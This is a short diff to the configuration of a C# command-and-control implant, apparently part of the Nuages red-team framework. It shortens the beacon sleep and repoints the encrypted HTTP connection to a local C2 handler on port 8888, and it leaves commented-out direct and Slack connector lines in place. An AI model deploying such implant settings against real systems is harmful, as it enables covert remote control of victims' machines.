@@ -10,7 +10,7 @@ namespace NuagesSharpImplant
             Dictionary<string, string> config = new Dictionary<string, string>();
 
             // Sleep time in between heartbeats
-            config["sleep"] = "10";
+            config["sleep"] = "1";
 
             // Buffer size for pipes (file transfers / tcp / interactive)
             config["buffersize"] = "65535";
@@ -19,10 +19,10 @@ namespace NuagesSharpImplant
             config["refreshrate"] = "500";
 
             // If the Direct connector is used (VERY BAD PRACTICE - Only for POC)
-            // DirectConnection connection = new DirectConnection("http://127.0.0.1:3030/implant/", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
+            //DirectConnection connection = new DirectConnection("http://127.0.0.1:3030/implant/", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
 
             // If the HTTPAES256 Handler is used:
-            HTTPAES256Connection connection = new HTTPAES256Connection("http://127.0.0.1:8080", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
+            HTTPAES256Connection connection = new HTTPAES256Connection("http://127.0.0.1:8888", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
 
             // If the SLACKAES256 Handler is used:
             // SLACKAES256Connection connection = new SLACKAES256Connection("password", "CHANNELID", "SLACK_BOT_TOKEN", "SLACK_APP_TOKEN", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
